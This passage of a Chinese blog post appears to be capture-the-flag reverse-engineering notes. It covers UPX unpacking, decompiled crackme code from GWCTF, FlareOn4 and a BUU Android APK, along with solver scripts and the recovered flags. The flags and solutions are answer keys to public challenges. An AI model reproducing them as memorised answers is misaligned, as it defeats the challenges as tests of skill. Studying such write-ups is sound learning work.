class="code"><pre><span class="line">.\upx.exe -d .\attachment\attachment</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210610004111012.png"></p><p><img src="/2021/05/28/CTF//image-20210610005411954.png"></p><p>但是这个似乎不是64位的可执行文件，而是i386。。应该是32位，ida32打开之后看函数太多先查找字符串</p><p><img src="/2021/05/28/CTF//image-20210610010158519.png"></p><p>我踏马直接大雾，这是什么牛马，这为啥就直接就在这，这是签到吗，为啥还叫level2啊。。。想了许久，也许比赛本来是面向新生的，新生可能对upx的脱壳方法不太了解罢。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;Just_upx_-d&#125;</span><br></pre></td></tr></table></figure><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><p><strong>TAG:</strong></p><p><img src="/2021/05/28/CTF//image-20210610010527059.png"></p><p>关键<code>mian</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>);</span><br><span class="line">    a2 = (<span class="type">char</span> **)((<span class="type">char</span> *)v6 + <span class="number">4</span> * i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = v6[j];</span><br><span class="line">    dword_60107C = HIDWORD(v6[j]);</span><br><span class="line">    a2 = (<span class="type">char</span> **)&amp;unk_601060;</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    LODWORD(v7[j]) = dword_601078;</span><br><span class="line">    HIDWORD(v7[j]) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_400770(v7, a2) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明天再说</p><h2 id="注册程序的破解-CTF向"><a href="#注册程序的破解-CTF向" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="其他文件逆向"><a href="#其他文件逆向" class="headerlink" title="其他文件逆向"></a>其他文件逆向</h2><h3 id="pyc文件逆向"><a href="#pyc文件逆向" class="headerlink" title="pyc文件逆向"></a>pyc文件逆向</h3><h4 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h4><p><strong>考的知识点</strong></p><p>主要是<code>异或</code>、<code>取模</code>的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是<code>a^a^b=b</code></p><p><strong>解题过程</strong></p><p>懒得再下函数库了，直接<a href="https://tool.lu/pyc/">在线网站</a>搞算了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">print(&#x27;Welcome to Re World!&#x27;)</span></span><br><span class="line"><span class="string">print(&#x27;Your input1 is your flag~&#x27;)</span></span><br><span class="line"><span class="string">input1 = &#x27;flag&#x27;</span></span><br><span class="line"><span class="string">code = &#x27;&#x27;</span></span><br><span class="line"><span class="string">l = len(input1)</span></span><br><span class="line"><span class="string">for i in range(l):</span></span><br><span class="line"><span class="string">    num = ((ord(input1[i]) + i) % 128 + 128) % 128</span></span><br><span class="line"><span class="string">    code += chr(num)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(l - 1):</span></span><br><span class="line"><span class="string">    code[i] = code[i] ^ code[i + 1]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line">l = <span class="built_in">len</span>(code)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    code[i] = <span class="built_in">ord</span>(code[i]) ^ <span class="built_in">ord</span>(code[i + <span class="number">1</span>])</span><br><span class="line">    code[i] = <span class="built_in">chr</span>(code[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = <span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i]) - i) % <span class="number">128</span>)</span><br><span class="line">    <span class="built_in">print</span>(num, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="js文件逆向"><a href="#js文件逆向" class="headerlink" title="js文件逆向"></a>js文件逆向</h3><p>这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。</p><h4 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h4><p>给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;prompt&quot;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(<span class="regexp">/[a-zA-Z]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(<span class="regexp">/[a-zA-Z]/g</span>, </span><br><span class="line"><span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">            (c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>那个<code>replace</code>函数负责遍历所有大小写字母，后面的<code>function</code>主要负责进行转换，将每个大小写字母带入其中即可，其中<code>90-&gt;&#39;Z&#39;</code>、<code>122-&gt;&#39;z&#39;</code>。后面的就很简单了，</p><ol><li>如果该字符是大写字母就将<code>Z</code>的ASCII码值与<code>c本身的ASCII码值+13</code>进行比较</li><li>如果<code>Z</code>比较大，就返回c本身的字符串，</li><li>反之则返回c的ASCII码值<code>-26</code>的数值所代表的ASCII字符。</li><li>小写字母是亦同理。</li></ol><p>这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的</p><p><img src="/2021/05/28/CTF//image-20210531174558489.png" alt="image-20210531174558489"></p><p>rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）</p><p><img src="/2021/05/28/CTF//image-20210531174817470.png" alt="image-20210531174817470"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</span><br></pre></td></tr></table></figure><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="方向介绍"><a href="#方向介绍" class="headerlink" title="方向介绍"></a>方向介绍</h2><p>这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。</p><h2 id="一般Android逆向"><a href="#一般Android逆向" class="headerlink" title="一般Android逆向"></a>一般Android逆向</h2><h3 id="buu、findit"><a href="#buu、findit" class="headerlink" title="buu、findit"></a>buu、findit</h3><p><strong>题目描述</strong></p><p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交</p><p><a href="https://files.buuoj.cn/files/7b8602971727c6c82ec0d360d5cad2c0/6a428ff2-25d7-403c-b28e-3f980a10a5a2.apk?token=eyJ1c2VyX2lkIjo1ODI5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMTV9.YLL-JQ.1mkBIGgecp2UxMwmP7W7hIN_9NM"> buu在线题目附件地址</a></p><p><strong>解题过程</strong></p><p>给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。</p><p><img src="/2021/05/28/CTF//image-20210530102603082.png" alt="image-20210530102603082"></p><p>看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">edit</span> <span class="operator">=</span> (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">text</span> <span class="operator">=</span> (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.findit.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猜测下面这段应该是获得flag 的关键<code>text.setText(String.valueOf(y));</code>这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            y[i2] = b[i2];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> ((y[i2] &gt; <span 